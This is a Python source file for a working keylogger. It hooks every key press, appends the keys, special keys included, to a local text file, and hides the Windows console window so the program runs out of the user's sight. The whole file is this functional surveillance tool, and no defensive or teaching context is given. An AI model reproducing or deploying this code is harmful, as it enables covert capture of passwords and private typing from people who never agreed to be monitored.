import keyboard     # pip install keyboard
import os           # Built-in module for interacting with the operating system
import sys          # Built-in module for system-specific parameters and functions
import threading    # Built-in module for working with threads
import time         # Built-in module for time-related functions

def log_keystrokes(log_file):
    def on_press(event):
        key_name = event.name
        with open(log_file, "a") as f:
            if key_name == "space":
                f.write(" ")
            elif key_name == "enter":
                f.write("[ENTER]")
            elif key_name == "backspace":
                f.write("[BACKSPACE]")
            elif key_name == "tab":
                f.write("[TAB]")
            elif key_name == "caps lock":
                f.write("[CAPS_LOCK]")
            elif key_name == "shift":
                f.write("[SHIFT]")
            elif key_name == "ctrl":
                f.write("[CTRL]")
            elif key_name == "alt":
                f.write("[ALT]")
            elif key_name == "esc":
                f.write("[ESC]")
            elif key_name.startswith("num "):
                # Handle numpad keys
                f.write(f"[{key_name.upper()}]")
            elif key_name.startswith("ctrl+alt") or key_name.startswith("ctrl+shift") or key_name.startswith("alt+shift"):
                f.write(f"[{key_name.upper()}]")
            elif len(key_name) > 1:

                f.write(f"[{key_name.upper()}]") # Other special keys
            else:
                f.write(key_name)

    keyboard.on_press(on_press)
    keyboard.wait()  # Wait for a key press


def start_keylogger(log_file):
    def exit_on_escape():
        keyboard.wait('esc')
        print("\nKeylogger stopped. Exiting...")
        os._exit(0)  # Terminate the entire process

    try:
        # Create a separate thread for key logging
        keylogger_thread = threading.Thread(target=log_keystrokes, args=(log_file,))
        keylogger_thread.daemon = True
        keylogger_thread.start()

        # Create a separate thread for the escape key listener
        exit_thread = threading.Thread(target=exit_on_escape)
        exit_thread.daemon = True
        exit_thread.start()

        # Hide the console window (Windows-specific)
        try:
            import win32console, win32gui, win32con
            console_hwnd = win32console.GetConsoleWindow()
            win32gui.ShowWindow(console_hwnd, win32con.SW_HIDE)
        except ImportError:
            pass  # if win32con doesn't work, it's fine.

        print("Keylogger started. Logging keystrokes...")
        # Keep the main thread alive
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    log_file = "keystrokes.txt"  # The log file to store the captured keystrokes
    start_keylogger(log_file)